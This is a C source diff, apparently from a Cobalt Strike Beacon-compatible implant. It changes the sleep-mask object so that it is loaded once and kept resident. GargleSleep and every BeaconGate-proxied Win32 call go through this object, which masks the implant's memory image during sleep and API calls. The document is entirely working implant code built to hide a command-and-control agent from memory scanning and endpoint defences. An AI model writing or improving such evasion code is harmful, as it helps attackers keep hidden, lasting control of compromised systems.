@@ -55,25 +55,29 @@ static int kit_path_forced(void) {
  * and runs every call Beacon hands it - the sleep itself and each
  * BeaconGate-proxied Win32 call - masking Beacon around it when fc->bMask
  * says so. The object sits in the SSSS region with bit 31 of the length
- * word set (the TS sets it for the kit's dictionary hook return) and is
- * loaded afresh for every call through the ordinary COFF loader (boff.cpp
- * conv 2), which fills the BEACON_INFO from the live image. What this does
- * not give a mask is memory of its own between calls - timers, keys, a
- * kept gadget table - the official engine keeps the object resident. */
+ * word set (the TS sets it for the kit's dictionary hook return). It is
+ * loaded once and stays resident, as it does with the official Beacon:
+ * every call goes to its entry point by address, with a BEACON_INFO filled
+ * from the live image. (A load per call ran inside whatever BOF was
+ * loading or running at the time and recycled its block - the loader
+ * cache holds one - and cost three ungated Virtual* calls per gated
+ * one.) */
 static int g_sm410_state; /* 0 = region not probed, 1 = in service, 2 = none or broken */
+static RESIDENT_OBJECT g_sm410_obj; /* its block and entry point, once loaded */
 
-static BOOL sm410_exec(FUNCTION_CALL * fc)
+/* Load the object for good. FALSE = there is no usable object: the region
+ * holds none, or the object does not link. */
+static BOOL sm410_load(void)
 {
 	char * decoded;
 	datap parser;
 	DWORD entry;
 	int dlen, contract, prefix;
+	RESIDENT_OBJECT obj;
 
-	if (g_sm410_state != 1 || fc == NULL)
-		return FALSE;
+	memset(&obj, 0, sizeof(obj));
 	decoded = (char *)malloc(SLEEPMASK_REGION_PATCH);
 	if (decoded == NULL) {
-		g_sm410_state = 2;
 		spawn_log("sm410: no memory", 0);
 		return FALSE;
 	}
@@ -81,7 +85,6 @@ static BOOL sm410_exec(FUNCTION_CALL * fc)
 	if (dlen <= 16 || !contract) {
 		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
 		free(decoded);
-		g_sm410_state = 2;
 		spawn_log("sm410: region has no 4.10 object len=", (long)dlen);
 		return FALSE;
 	}
@@ -98,29 +101,40 @@ static BOOL sm410_exec(FUNCTION_CALL * fc)
 	prefix = dlen - parser.length;
 	entry = data_int(&parser);
 
-	/* decoded holds the plaintext object while Beacon is masked - pull it
-	 * into the walk, then wipe it before the free */
-	track_memory_add(decoded, SLEEPMASK_REGION_PATCH, TRACK_MEMORY_MALLOC, TRUE, NULL);
-	spawn_log("sm410: exec api=", (long)fc->function);
-	if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)fc, (int)sizeof(FUNCTION_CALL), 2)) {
+	if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&obj, (int)sizeof(obj), 3) || obj.entry == NULL) {
+		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
+		free(decoded);
 		spawn_log("sm410: load FAILED", 0);
-		g_sm410_state = 2;
+		return FALSE;
 	}
-	track_memory_remove(decoded);
+	/* the object lives in its own block now: nothing of it stays on the heap */
 	memset(decoded, 0, SLEEPMASK_REGION_PATCH);
 	free(decoded);
-	return g_sm410_state == 1;
+	g_sm410_obj = obj;
+	/* what a BOF's BeaconInformation() reports as the sleep mask */
+	beacon_sleep_mask_set_exec(obj.base, obj.text, obj.total);
+	return TRUE;
 }
 
-/* the gate's executor: every gated call goes through the object. When the
- * object cannot be loaded it is taken out of the gate and the call goes
- * back to gate_dispatch, which runs it with the built-in executors */
+/* the gate's executor: every gated call goes through the object. When
+ * there is no usable object it is taken out of the gate and the call
+ * goes back to gate_dispatch, which runs it with the built-in
+ * executors. The object runs from its own block with the image in the
+ * clear; the info sits on this stack and is gone when it returns. */
 static BOOL sm410_gate(FUNCTION_CALL * fc)
 {
-	if (!sm410_exec(fc)) {
+	BEACON_INFO info;
+
+	if (g_sm410_state != 1 || fc == NULL)
+		return FALSE;
+	if (g_sm410_obj.entry == NULL && !sm410_load()) {
+		g_sm410_state = 2;
 		gate_set_executor(NULL);
 		return FALSE;
 	}
+	spawn_log("sm410: call api=", (long)fc->function);
+	beacon_info_fill(&info, g_sm410_obj.base, g_sm410_obj.text, g_sm410_obj.total);
+	((void (*)(BEACON_INFO *, FUNCTION_CALL *))g_sm410_obj.entry)(&info, fc);
 	return TRUE;
 }
 #endif
@@ -155,9 +169,9 @@ void GargleSleep(DWORD time) {
 		fc.numOfArgs   = 1;
 		fc.args[0]     = (unsigned long long)time;
 		fc.bMask       = TRUE;
-		/* the same road as every gated call: the re-entrancy guard (the
-		 * object's own load makes gated calls) and the bMask rules (an
-		 * interactive Beacon sleeps in the clear) */
+		/* the same road as every gated call: the re-entrancy guard (loading
+		 * the object makes gated calls) and the bMask rules (an interactive
+		 * Beacon sleeps in the clear) */
 		gate_set_executor(sm410_gate);
 		gate_dispatch(&fc);
 		if (g_sm410_state == 1)
